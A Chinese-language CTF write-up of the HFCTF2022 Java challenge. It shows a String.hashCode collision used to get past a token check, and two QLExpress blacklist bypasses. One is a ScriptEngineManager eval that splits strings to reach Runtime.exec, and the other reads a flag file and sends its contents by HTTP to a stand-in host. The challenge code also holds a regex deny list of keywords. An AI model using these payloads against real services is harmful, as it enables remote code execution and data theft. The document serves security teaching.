
某CTF题目如下：

```java
public class QlApplication {
@RequestMapping({"/"})
public String index(){
return "welcome! :)";
}

    @RequestMapping({"/exp"})
    public String exp(@RequestBody Map params) throws Exception {
        String key  = (String)params.get("token").toString();
        String secret = "HFCTF2022";
        if (key.hashCode() == secret.hashCode() && !secret.equals(key)) {
            String cmd = params.get("cmd").toString();
            Pattern pattern = Pattern.compile("Process|runtime|javascript|\\+|char|\\\\|from|\\|\\]|load",2);
            if (pattern.matcher(cmd).find()){
                return "nononono!!";
            }

            ExpressRunner runner = new ExpressRunner();
            DefaultContext<String,Object> context = new DefaultContext<>();
            Object r = runner.execute(cmd,context,null,true,false);
            return "hack me";
        }

        return key;
    }
}

```

## java hash碰撞

其中的一个考点是，java 的hashcode，需要找到一个与原字符串不相等但hashcode相同的字符串。
String的hashcode的实现：
jdk1.8里面的源码：

```
/*Returns a hash code for this string. The hash code for a String object is computed as
s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1]

using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)
Returns:
a hash code value for this object.
*/
public int hashCode() {
int h = hash;
if (h == 0 && value.length > 0) {
char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}

```

计算的关键就是for循环中的h = 31 * h + val[i]，对字符串的每一个字符依次进行该运算。下面有几个例子

```
//97
"a".hashCode()
//97*31+98=3105
"ab".hahsCode()
//3105*31+99=96354"abc".hashCode()
```

可以看到前面字符的hash值也会影响后续hash值，于是我们能够构造出如下等式：
```
31*h1 + a[i] = 31*h2 + b[j]
(h1-h2)*31 = b[j]-a[i]   
```

假如有字符串aa，我们能够很容易计算出与之hash相等的另一字符串bB

```
//bB --> aa
31*98 + 66 = 3104 = 31*97 + 97 (aa)
```

后续字符串的hash也相等

```
//trueSystem.out.println("bBDDD".hashCode()=="aaDDD".hashCode());   
```

因此本题想要构造出与HFCTF2022的hash相等的另一字符串，我们只需要找到与字符HF的hash相等的字符即可：
```
HF=31*72+70=2302=31*71+101=Ge=31*73+39=I'
```

## hash碰撞另一种思路

使用hashcat工具解决：

先算出给出字符串的hash值（用16进制表示）,然后用hashcat爆破：

```
System.out.println(Integer.toHexString("HFCTF2022".hashCode())); //865bf5b5

hashcat.exe -m 18700 -a 3 865bf5b5 --show 
```
```
xxxxx\hashcat-6.2.5>hashcat.exe -m 18700 -a 3 865bf5b5 --show
865bf5b5:18wd6vi
```

## QLExpress

另外一个考点,题中的`ExpressRunner`是使用的[QLExpress](https://github.com/alibaba/QLExpress),QLExpress支持直接运行java代码,但是有黑名单类的限制,黑名单:
+ java.lang.System.exit
+ java.lang.Runtime.exec
+ java.lang.ProcessBuilder.start
+ java.lang.reflect.Method.invoke
+ java.lang.reflect.Class.forName
+ java.lang.reflect.ClassLoader.loadClass
+ java.lang.reflect.ClassLoader.findClass

绕过方法一:使用scriptEngineManager:

`cmd = new javax.script.ScriptEngineManager(null).getEngineByName("js").eval("java.lang.Run".concat("time.getRun").concat("time().exec('calc')"))`

绕过方法二:只是限制了不能执行命令,还有其他的读文件等操作可以进行,所以可以读出文件内容再通过http将flag发送出来:
```
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
String flag = new String(Files.readAllBytes(java.nio.file.Paths.get(new java.net.URI("file:///j:/tmp/flag.txt"))));
HttpURLConnection conn = (HttpURLConnection) new URL("http://127.0.0.1:8080/?a="+flag).openConnection();
conn.setRequestMethod("GET");
conn.getResponseCode()
```